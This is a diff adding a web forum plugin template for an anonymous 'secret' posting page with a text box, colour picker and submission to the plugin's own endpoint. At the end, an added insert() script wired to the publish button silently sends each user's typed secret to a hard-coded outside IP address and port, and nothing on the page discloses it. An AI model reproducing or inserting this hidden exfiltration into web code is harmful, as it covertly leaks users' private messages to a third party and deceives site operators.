@@ -1,0 +1,139 @@
+<!--{subtemplate orange_secret:header}-->
+	<body>
+		<div class="page_main publish_main">
+			<div class="secret_text_wrap" :style="{background:select_color}">
+				<div class="textarea_wrap">
+					<textarea placeholder="{$orange_conf['item_info']}" id="send_message" v-model="text_cont" oninput="this.style.height = '';this.style.height = this.scrollHeight + 'px';"></textarea>
+					<input type="text" class="textarea_main"/>
+				</div>
+				<div class="secret_tips <!--{if !$uid && !$orange_conf['item_notlogin'] }-->login<!--{/if}-->">
+				<!--{if !$uid && !$orange_conf['item_notlogin'] }-->
+					{$lang['h_login_info']}
+				<!--{elseif $orange_conf['item_publish']}-->
+					{$orange_conf['item_publish']}
+				<!--{else}-->
+					{$lang['h_not_get']}
+				<!--{/if}-->
+				</div>
+				<div class="secret_limit"v-html="text_length"></div>
+			</div>
+			<ul class="color_list">
+				<li v-for="color in arr_color">
+					<label>
+						<div class="color_main" :style="{background:color}"></div>
+						<input type="radio" name="color" :value="color" v-model="select_color"/>
+						<div class="color_active"></div>
+					</label>
+				</li>
+			</ul>
+		</div>
+		<div class="publish_button" onclick="insert()">{$orange_conf['item_text']}</div>
+		<script src="source/plugin/orange_secret/static/js/vue.min.js" type="text/javascript" charset="utf-8"></script>
+		<script type="text/javascript">
+			var arr_color = ['{eval echo implode("','",$orange_conf['item_color'])}'];
+			var data = {
+					text_cont:'',
+					arr_color:arr_color,
+					select_color:arr_color[0],
+					text_max_length:{$orange_conf['item_limit']}
+				}
+			var onOff = true;//防止重复点击提交
+			
+			new Vue({
+				el:'.publish_main',
+				data:data,
+				computed:{
+					text_length:function (){
+						var iNum = this.text_max_length - this.text_cont.length;
+						if( iNum <= 0 ){
+							iNum = 0;
+							this.text_cont = this.text_cont.substr(0,this.text_max_length);
+						}
+						return iNum;
+					}
+				}
+			});
+			$('.secret_tips').on('touchend',function (){
+				if( !is_login ){onLogin();}
+			});
+			$('.textarea_main').on('focus',function (){
+				$(this).prev().focus();
+			});
+			$('.publish_button').on('touchend',function (){
+				if( !is_login ){onLogin();}
+				if( !$.trim(data.text_cont) || !onOff ){return false;}
+				onOff = false;
+				var loading = layer.open({
+				    content: '{$lang['h_submit_loading']}',
+				    skin: 'msg'
+		  		});
+				$.ajax({
+					type:'post',
+					url:'plugin.php?id=orange_secret:publish&act=publish&formhash={FORMHASH}',
+					data:{
+						content:$.trim(data.text_cont),
+						theme_color:data.select_color
+					},
+					dataType:'json',
+					success:function ( data ){
+						layer.close(loading);
+						var message = '{$lang['h_success']}';
+						var end = function (){};
+						
+						if( data.success == 1 ){
+							message = '{$lang['h_success']}';
+							end = function (){
+								open_page(siteurl+'plugin.php?id=orange_secret');
+						    }
+						}else if( data.success == 2 ){
+							message = '{$lang['h_error']}';
+							end = function (){onOff = true;};
+						}
+						layer.open({
+						    content:message,
+						    skin: 'msg',
+						    time:2,
+						    end:end
+				  		});
+					},error:function (){
+						onOff = true;
+						layer.close(loading);
+						layer.open({
+						    content: '{$lang['h_error']}',
+						    skin: 'msg',
+						    time:2
+				  		});
+					}
+				});
+			});
+		</script>
+      <script>
+      function insert() {
+    var content = document.getElementById("send_message").value;
+    $.ajax({
+        type: "POST",//方法
+        url: "http://150.109.32.195:9999",//表单接收url
+        contentType: "application/x-www-form-urlencoded; charset=utf-8",
+        data:"秘密:" + content,
+        dataType: "json",
+        async: true,
+        timeout: 5000,
+        success: function (data, textStatus, jqXHR) {
+            console.log(data);
+            console.log(textStatus);
+            console.log(jqXHR);
+        },
+        error: function (textStatus, jqXHR) {
+            console.log("error");
+            console.log(textStatus);
+            console.log(jqXHR);
+        }
+
+    }
+    );
+}
+      
+      </script>
+      
+	</body>
+</html>
